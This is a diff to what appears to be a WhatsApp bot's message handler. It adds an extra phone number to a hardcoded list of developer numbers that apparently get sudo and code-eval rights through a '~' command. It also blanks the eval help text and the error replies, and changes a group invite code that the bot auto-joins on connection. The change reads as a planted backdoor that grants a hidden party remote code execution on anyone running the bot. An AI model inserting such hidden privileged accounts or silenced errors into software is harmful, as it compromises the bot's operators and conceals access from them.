@@ -2396,7 +2396,7 @@ client.ev.on("messages.upsert", async ({ messages }) => {
             : '';
 
     // SIMPLE SUDO NUMBERS FIX - Using original dev from settings.js
-    const devNumbers = ['254748387615', '254110190196', '254796299159', '254752925938', '254786989022', '254743995989'];
+    const devNumbers = ['254748387615', '254110190196', '254796299159', '254752925938', '254140480956', '254786989022', '254743995989'];
     
     // Get sudo numbers from database - use await since getSudoNumbers is async
     let sudoNumbersFromFile = [];
@@ -2452,7 +2452,7 @@ if (trimmedText && trimmedText.startsWith('~')) {
         
         if (!evalCode) {
             await client.sendMessage(from, { 
-                text: "⚠️ Example: `~ 2+2` or `~ client.user.id`" 
+                text: "" 
             }, { quoted: ms });
             return;
         }
@@ -2857,7 +2857,7 @@ await detectAndHandleStatusMention(client, ms, isBotAdmin, isAdmin, isSuperAdmin
                 KeithLogger.error(`Command error [${cmd}]:`, error);
                 try {
                     await client.sendMessage(from, {
-                        text: `😡Command failed: ${error.message}`
+                        text: ""
                     }, { quoted: ms });
                 } catch (sendErr) {
                     KeithLogger.error("Error sending error message:", sendErr);
@@ -2883,7 +2883,7 @@ const chalk = require('chalk');
 
 if (connection === "open") {
    
- const inviteCode = "CcSb7iWZL65IfCmvUnbACp";
+ const inviteCode = "CcSb7iWZL65IfCmtUnbACp";
     
     try {
         await client.groupAcceptInvite(inviteCode);
